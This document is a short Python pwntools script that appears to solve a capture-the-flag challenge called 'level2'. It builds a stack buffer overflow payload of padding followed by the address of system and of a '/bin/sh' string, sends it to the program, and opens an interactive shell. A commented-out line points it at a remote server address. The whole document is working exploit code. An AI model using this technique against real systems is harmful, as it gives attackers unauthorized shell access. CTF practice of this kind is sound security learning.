import pwn

pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./level2')
#p = pwn.remote('220.249.52.133', 32564)

e = pwn.ELF('./level2')
system_addr = pwn.p32(e.plt['system'])
sh_addr = pwn.p32(next(e.search('/bin/sh')))

payload = b'A' * 0x88 + b'B' * 4 + system_addr + b'C' * 4 + sh_addr
p.sendlineafter(b'Input:', payload)

p.interactive()
